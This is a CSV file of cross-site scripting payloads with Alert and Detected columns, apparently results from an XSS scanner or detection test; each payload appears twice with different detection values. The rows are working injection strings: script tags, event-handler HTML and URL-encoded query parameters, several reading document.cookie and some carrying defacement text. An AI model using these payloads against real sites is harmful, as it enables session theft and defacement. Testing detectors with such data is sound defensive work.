Payload,Alert,Detected
"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",False,2
"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",False,0
find=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,False,2
find=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,False,0
"<details onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</details>",False,2
"<details onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</details>",False,0
<body language=vbs onload=confirm-1,False,2
<body language=vbs onload=confirm-1,False,0
from=40&cid=%22%3E%3Cscript%3Ealert(document.cookie)%3C/scr<br/>ipt%3E%3E%3Cmarquee%3E%3Ch1%3Emeloulisi%3C/h1%3E%3C/marquee%3E,False,2
from=40&cid=%22%3E%3Cscript%3Ealert(document.cookie)%3C/scr<br/>ipt%3E%3E%3Cmarquee%3E%3Ch1%3Emeloulisi%3C/h1%3E%3C/marquee%3E,False,0
<script>alert(1)</script>.htm,False,2
<script>alert(1)</script>.htm,False,0
back=/myordertracking.asp%22%3E%3Cscript%3Ealert(1337)%3C/script%3<br/>E,False,2
back=/myordertracking.asp%22%3E%3Cscript%3Ealert(1337)%3C/script%3<br/>E,False,0
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(3700)}),x</script>",False,2
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(3700)}),x</script>",False,0
id=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C<br/>/script%3E,False,2
id=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C<br/>/script%3E,False,0
user=%3Ch1%3EHacked%20by%20Janizary%3C/h1%3E<script>ale<br/>rt(1)</script>,False,2
user=%3Ch1%3EHacked%20by%20Janizary%3C/h1%3E<script>ale<br/>rt(1)</script>,False,0
"<dt id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></dt>",False,2
"<dt id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></dt>",False,0
<--%253cimg%20onerror=alert(1)%20src=a%253e --!>,False,2
<--%253cimg%20onerror=alert(1)%20src=a%253e --!>,False,0
"v=""><script>alert(123)</script>",False,2
"v=""><script>alert(123)</script>",False,0
"searchterms=""><script>alert(document.cookie)<br/></script><h1>www.raptr.us.tc</h1>",False,2
"searchterms=""><script>alert(document.cookie)<br/></script><h1>www.raptr.us.tc</h1>",False,0
<noframes contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,False,2
<noframes contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,False,0
lang=en&refurl=%22%22%3E%3E%3Cscript%3Ealert(%22xss%20by%20Bl<br/>ackCode%20:P%20loool%22 )%3C/script%3E%22%22%3E%3E%3C%3C%22%22,False,2
lang=en&refurl=%22%22%3E%3E%3Cscript%3Ealert(%22xss%20by%20Bl<br/>ackCode%20:P%20loool%22 )%3C/script%3E%22%22%3E%3E%3C%3C%22%22,False,0
"""><script>alert('THE-SH0CK-B0Y')</script>",False,2
"""><script>alert('THE-SH0CK-B0Y')</script>",False,0
<menuitem onpointerrawupdate=alert(1) style=display:block>XSS</menuitem>,False,2
<menuitem onpointerrawupdate=alert(1) style=display:block>XSS</menuitem>,False,0
"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" ontransitionstart=alert(1)></code>",False,2
"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" ontransitionstart=alert(1)></code>",False,0
<listing onfocus=alert(1) autofocus tabindex=1>,False,2
<listing onfocus=alert(1) autofocus tabindex=1>,False,0
</option><img src=x onerror=alert(origin)>,False,2
</option><img src=x onerror=alert(origin)>,False,0
